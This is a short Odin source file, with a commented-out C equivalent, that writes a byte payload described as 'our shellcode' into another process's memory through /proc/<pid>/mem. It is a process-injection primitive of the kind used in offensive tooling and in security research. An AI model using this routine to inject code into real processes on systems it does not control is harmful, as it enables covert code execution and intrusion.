package main

import "core:fmt"
import os "core:os/os2"
import "core:sys/linux"
/*
  Write a payload to a specified process at a given offset using the procfs mem file.
   
  - address: The memory address to write to. Used as the offset in the mem file when writing.
  - pid: The pid of the injected process.
  - payload: A pointer to our shellcode to be copied into the process.
*/
procfs_proc_mem_write :: proc(address: uintptr, pid: linux.Pid, payload: []byte) -> (ok: bool) {
	f_name := fmt.aprintf("/proc/%d/mem", pid)
	defer delete(f_name)
	file, err := os.open(f_name, {.Read, .Write, .Trunc})
	assert(err == nil)
	_, err2 := os.seek(file, i64(address), .Start)
	assert(err2 == nil)
	written, err_w := os.write(file, payload)
	if err_w != nil {
		fmt.println("failed to write to mem file ", err_w)
	}
	fmt.println("wrote bytes: ", written)
	return true
}


// int procfs_proc_mem_write(long address, long pid, const char *payload)
// {
//
//     char filepath[256];
//
//     // Add the pid to the procfs path
//     snprintf(filepath, sizeof(filepath), "/proc/%ld/mem", pid);
//
//     // Open the mem file for writing and set the file index to our required offset
//     FILE *file = fopen(filepath, "w+");
//     fseek(file, address, SEEK_SET);
//
//     // Write the payload to the mem file
//     fwrite(payload, sizeof(char), strlen(payload), file);
//     fclose(file);
//
//     return 0;
// }
